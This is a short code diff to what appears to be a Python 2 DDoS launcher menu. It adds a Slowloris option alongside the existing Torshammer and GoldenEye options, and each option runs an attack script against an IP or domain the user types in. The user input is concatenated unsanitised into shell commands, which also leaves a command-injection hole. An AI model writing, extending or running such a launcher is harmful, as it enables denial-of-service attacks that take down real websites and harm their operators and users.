@@ -43,7 +43,8 @@ if choice == '2':
   	print ("")
 	print ("Torshammer = 1")
   	print ("GoldenEye = 2")
- 	print ("")
+ 	print ("Slowloris = 3")
+	print ("")
 	choice = raw_input("[root@ddos]#")
  	if choice == '1':
 		ip = raw_input("Enter IP/Website: ")
@@ -55,3 +56,7 @@ if choice == '2':
 		ip = raw_input("Enter Website URL: ")
 		cal("cd files/GoldenEye && python goldeneye.py "+ ip +"")
 
+	if choice == '3':
+		ip = raw_input("Enter Domain: ")
+		cal("cd files/slowloris && python slowloris.py "+ ip +"")
+exit
